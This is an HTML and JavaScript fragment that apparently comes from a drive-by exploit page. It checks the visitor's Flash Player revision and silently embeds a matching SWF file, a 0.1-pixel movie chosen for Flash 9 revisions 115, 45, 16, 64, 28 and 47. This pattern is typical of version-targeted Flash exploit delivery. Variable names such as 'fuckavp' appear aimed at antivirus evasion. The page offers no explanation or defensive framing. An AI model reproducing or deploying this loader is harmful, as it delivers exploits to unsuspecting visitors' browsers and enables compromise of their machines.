<Script src="swfobject.js" type="text/javascript"></Script>  
<div id="flashcontent">111</div><div id="flashversion">222</div>
<script type="text/javascript">
var version=deconcept.SWFObjectUtil.getPlayerVersion();
if(version['major']==9){
	document.getElementById('flashversion').innerHTML="";
	if(version['rev']==115){
		var fuckavp = "DZ";
		var fuckaxp = "aa";
		var fuckaqp = "c";
		var so=new SWFObject("./i115.swf","mymovie","0.1","0.1","9","#000000");
		so.write("flashcontent")
	}else if(version['rev']==45){
		var fuckavpxa = "P";
		var so=new SWFObject("./i45.swf","mymovie","0.1","0.1","9","#000000");
		so.write("flashcontent")
	}else if(version['rev']==16){
		var so=new SWFObject("./i16.swf","mymovie","0.1","0.1","9","#000000");
		so.write("flashcontent")
	}else if(version['rev']==64){
		var fuckavp = "DZ";
		var so=new SWFObject("./i64.swf","mymovie","0.1","0.1","9","#000000");
		so.write("flashcontent")
	}else if(version['rev']==28){
		var so=new SWFObject("./i28.swf","mymovie","0.1","0.1","9","#000000");
		so.write("flashcontent")
	}else if(version['rev']==47){
		var fuckavpx = "DZ";
		var so=new SWFObject("./i47.swf","mymovie","0.1","0.1","9","#000000");
		so.write("flashcontent")
	}else if(version['rev']>=124){
		if(document.getElementById){
			document.getElementById('flashversion').innerHTML=""
		}
	}
}
</ScripT>  